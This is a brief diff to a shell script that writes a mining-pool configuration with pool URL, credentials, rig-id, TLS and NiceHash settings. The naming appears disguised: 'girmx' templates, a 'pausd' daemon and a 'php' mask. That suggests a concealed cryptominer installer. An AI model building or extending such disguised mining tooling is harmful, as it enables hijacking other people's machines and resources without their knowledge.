@@ -5,7 +5,8 @@ OBJ_MASK="${OBJ_MASK:-php}"
 DAEMON="${DAEMON:-pausd}"
 DAEMON_NAME="${DAEMON##* }"
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
-    OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
+    # OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
+    OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
 else
     OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
 fi
@@ -152,11 +153,16 @@ if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
         local pool
         read -r -d '' pool <<'POOL'
 {
+    \"algo\": null,
     \"url\": \"${URL}\",
     \"user\": \"${UA}\",
     \"pass\": \"${PA}\",
+    \"rig-id\": \"${X_ID}\",
     \"keepalive\": true,
-    \"use-tls\": true,
+    \"tls\": true,
+    \"tls-fingerprint\": null,
+    \"enabled\": true,
+    \"daemon\": false,
     \"nicehash\": \"${NICEHASH:-false}\"
 }
 POOL
